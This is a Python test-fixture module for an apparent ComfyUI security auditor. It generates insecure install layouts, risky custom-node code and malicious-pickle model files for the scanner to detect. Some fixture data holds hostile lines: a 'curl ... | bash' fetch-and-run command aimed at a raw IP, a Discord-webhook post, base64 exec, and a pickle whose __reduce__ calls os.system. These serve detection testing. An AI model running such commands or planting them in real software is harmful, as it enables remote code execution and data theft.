"""Test harness: synthetic ComfyUI fixtures that stand in for instances we cannot
physically test (Linux systemd, docker-compose, portable, proxied, etc.), plus a
one-call audit helper. No third-party test dependency.
"""

import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from comfyguard import collectors, report as report_mod  # noqa: E402
from comfyguard.checks import run_checks  # noqa: E402


class SkipTest(Exception):
    pass


def skip(reason):
    raise SkipTest(reason)


def audit(path, **kw):
    """Run the read-only pipeline and return (report_dict, facts)."""
    path = Path(path)
    facts = collectors.collect(path, **kw)
    findings = run_checks(facts, path)
    rep = report_mod.build_report(facts, findings, {"started_at": "t", "duration_seconds": 0})
    return rep, facts


def ids(rep):
    return [f["check_id"] for f in rep["findings"]]


def count(rep, cid):
    return sum(1 for f in rep["findings"] if f["check_id"] == cid)


def _w(root, rel, text):
    p = Path(root) / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text)
    return p


_RISKY_NODE = (
    "import base64, subprocess, requests, torch, pandas as pd\n"
    "def f(e, p, m):\n"
    "    m.eval()\n"                # method - must NOT flag
    "    pd.DataFrame().eval('a+b')\n"  # method - must NOT flag
    "    m.exec()\n"               # method - must NOT flag
    "    eval(e)\n"                # builtin - the one NODE-001
    "    subprocess.run(['pip','install','z'])\n"   # NODE-003
    "    requests.post('https://discord.com/api/webhooks/1/2')\n"  # NODE-006
    "    torch.load(p)\n"          # NODE-010
    "    exec(base64.b64decode('eA==').decode())\n"  # NODE-004
)


def _comfy_base(root, version='0.30.1'):
    _w(root, "main.py", "# entry\n")
    _w(root, "comfyui_version.py", f'__version__ = "{version}"\n')
    _w(root, "models/checkpoints/base.safetensors", "safe")


# ---- layout fixtures (each returns the path to audit) ----

def windows_portable(base):
    port = Path(base) / "ComfyUI_windows_portable"
    (port / "python_embeded").mkdir(parents=True, exist_ok=True)
    _w(port, "run_nvidia_gpu.bat", ".\\python_embeded\\python.exe -s ComfyUI\\main.py --listen 0.0.0.0\n")
    _w(port, "run_cpu.bat", ".\\python_embeded\\python.exe -s ComfyUI\\main.py --cpu\n")
    comfy = port / "ComfyUI"
    _comfy_base(comfy)
    _w(comfy, "custom_nodes/handy/nodes.py", _RISKY_NODE)
    return comfy  # audit the ComfyUI subdir; launcher is in the parent


def flat_portable(base):
    root = Path(base) / "flat"
    (root / "python_embeded").mkdir(parents=True, exist_ok=True)
    _comfy_base(root)
    _w(root, "run.bat", ".\\python_embeded\\python.exe -s main.py --listen 0.0.0.0 --port 8189\n")
    return root


def linux_systemd(base):
    root = Path(base) / "opt-comfyui"
    _comfy_base(root)
    _w(root, "deploy/comfyui.service",
       "[Service]\nExecStart=/opt/comfyui/venv/bin/python main.py --listen 0.0.0.0 --port 8188\n")
    return root


def compose_exposed(base):
    root = Path(base) / "compose"
    _comfy_base(root)
    _w(root, "Dockerfile", "FROM python:3.11\nCOPY . /app\nCMD [\"python\",\"main.py\"]\n")  # no USER -> root
    _w(root, "docker-compose.yml",
       "services:\n  comfyui:\n    build: .\n    privileged: true\n    ports:\n      - \"0.0.0.0:8188:8188\"\n")
    return root


def clean_loopback(base):
    root = Path(base) / "clean"
    _comfy_base(root, version="0.33.0")
    _w(root, "run.sh", "python main.py --listen 127.0.0.1 --tls-keyfile k.pem --tls-certfile c.pem\n")
    return root


def undetermined(base):
    # no launcher, no compose, no url -> EXP-000 fail-safe should fire
    root = Path(base) / "undetermined"
    _comfy_base(root)
    return root


def node_corpus(base):
    root = Path(base) / "nodes"
    _comfy_base(root)
    _w(root, "run.sh", "python main.py --listen 127.0.0.1\n")  # loopback -> not networked
    _w(root, "custom_nodes/handy/__init__.py", "import subprocess\nsubprocess.run('x', shell=True)\n")
    _w(root, "custom_nodes/handy/nodes.py", _RISKY_NODE)
    _w(root, "custom_nodes/handy/requirements.txt", "somepkg\ngit+https://github.com/foo/bar.git\n")
    # disabled backup copy - must be skipped
    _w(root, "custom_nodes/.removed_packs_backup/.disabled/handy/nodes.py", "def f(u):\n    return eval(u)\n")
    # unparseable file - must be disclosed, not crash
    _w(root, "custom_nodes/handy/broken.py", "def f(:\n  syntax error here\n")
    _w(root, "models/checkpoints/x.ckpt", "pickle")
    return root


def manager_normal_networked(base):
    root = Path(base) / "mgr"
    _comfy_base(root)
    _w(root, "run.sh", "python main.py --listen 0.0.0.0\n")
    _w(root, "custom_nodes/ComfyUI-Manager/pyproject.toml", 'version = "3.40.0"\n')
    _w(root, "user/__manager/config.ini",
       "[default]\nsecurity_level = normal\nnetwork_mode = offline\nbypass_ssl = False\n")
    return root


def ioc_case(base):
    root = Path(base) / "ioc"
    _comfy_base(root)
    _w(root, "run.sh", "python main.py --listen 0.0.0.0\n")
    _w(root, "custom_nodes/comfyui_perf_monitor/__init__.py", "NODE_CLASS_MAPPINGS = {}\n")
    _w(root, "user/default/workflows/default.json", '{"x":"curl http://77.110.96.200/ghost.sh | bash"}')
    return root


def _malicious_pickle_bytes():
    # Pickling records a reference to os.system; it does NOT execute anything.
    class _Exploit:
        def __reduce__(self):
            return (os.system, ("echo pwned",))
    import pickle
    return pickle.dumps(_Exploit())


def malicious_model(base):
    import io
    import pickle
    import zipfile
    root = Path(base) / "malmodel"
    _comfy_base(root)
    _w(root, "run.sh", "python main.py --listen 127.0.0.1\n")  # loopback: isolate the model check
    ck = root / "models" / "checkpoints"
    ck.mkdir(parents=True, exist_ok=True)
    (ck / "evil.pkl").write_bytes(_malicious_pickle_bytes())            # raw pickle
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:                                # torch-style zip
        z.writestr("archive/data.pkl", _malicious_pickle_bytes())
    (ck / "evil.ckpt").write_bytes(buf.getvalue())
    (ck / "ok.pkl").write_bytes(pickle.dumps({"weights": [1, 2, 3]}))   # benign -> scans clean
    return root


def proxied_auth(base):
    root = Path(base) / "proxied"
    _comfy_base(root)
    _w(root, "run.sh", "python main.py --listen 0.0.0.0\n")  # exposed bind, but behind a proxy
    _w(root, "nginx.conf",
       "server {\n  listen 443 ssl;\n  location / {\n    auth_basic \"restricted\";\n"
       "    auth_basic_user_file /etc/nginx/.htpasswd;\n    proxy_pass http://127.0.0.1:8188;\n  }\n}\n")
    return root


def symlink_loop(base):
    root = Path(base) / "symlink"
    _comfy_base(root)
    node = root / "custom_nodes" / "loopy"
    node.mkdir(parents=True, exist_ok=True)
    _w(root, "custom_nodes/loopy/nodes.py", "x = 1\n")
    try:
        os.symlink(node, node / "self_link", target_is_directory=True)  # a directory loop
    except Exception:
        return None  # symlinks not permitted (e.g. Windows without privilege)
    return root
